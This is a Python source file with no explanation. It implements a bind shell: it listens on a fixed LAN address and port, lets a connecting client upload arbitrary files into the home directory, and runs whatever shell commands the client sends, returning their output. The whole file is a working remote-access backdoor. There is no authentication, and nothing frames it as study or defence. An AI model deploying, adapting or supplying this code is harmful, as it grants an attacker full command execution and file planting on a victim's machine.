

import socket
import time
import sys
import os
import subprocess

def process(client,addr):
    while True:
        try:
            status=client.recv(1).decode()
            while len(status)<1:
                status+=client.recv(1-len(status))
            print(status)
            if status=='1':
                while True:
                    try:
                        print('hi')
                        length=client.recv(5000).decode()
                        while len(length)<5000:
                            print(len(length))
                            length+=client.recv(5000-len(length)).decode()
                        print(length)
                        print(len(length))
                        length=length.replace('#','')

                        name=client.recv(5000).decode()
                        while len(name)<5000:
                            print(len(name))
                            name+=client.recv(5000-len(name)).decode()
                        print(name)
                        print(len(name))
                        name=name.replace('#','')
                        data=client.recv(int(length))
                        while len(data)<int(length):
                            print(len(data))
                            data+=client.recv(int(length)-len(data))
                        print(len(data))
                        path=f"{os.environ.get('HOME')}/{name}"
                        with open(path,'wb')as f:
                            f.write(data)
                            f.close()
                        client.send('shell'.encode())
                        break    
                    except:
                        client.send('no-sh'.encode())  

                        
            elif status=='2':
                while True:
                    try:
                        data = client.recv(1024).decode()
                        if data[:2]== 'cd':
                            os.chdir((data[3:] if data[2]== ' ' else data[2:]))
                        elif data[0:7]=='python3' or data[0:6]=='python':
                            os.system(f'{data}')
                        if len(data) > 0:
                            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                            output_bytes = cmd.stdout.read() + cmd.stderr.read()
                            output_str = str(output_bytes, 'utf-8')
                            if data[0:2]=='cd':
                                client.send(bytes( os.getcwd() + '>', 'utf-8'))
                            else:
                                client.send(bytes( os.getcwd() + '>'+'\n'+str(output_str), 'utf-8'))    
                            print(output_str)
                    except:
                        client.send(str(1024*'*').encode())
                        continue        
            else:
                break

                   
        except Exception as er:
            print(er)



def bind_server():

    try:
       server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
       server.bind(('192.168.1.105',8080))
       server.listen(1)
       print('server binded ... ')
    except:
        print('server could not bind ... ')   

    
    try:
        while True:
            client,addr=server.accept()
            client.send('ok'.encode())
            ack=client.recv(2).decode()
            if ack=='go':
                process(client,addr)
                break
            else:
                print('error to communication with clinet ... ')
                continue
                
    except:
        client.send('no'.encode())
        print('any client could not connect to me .... ')


bind_server()
        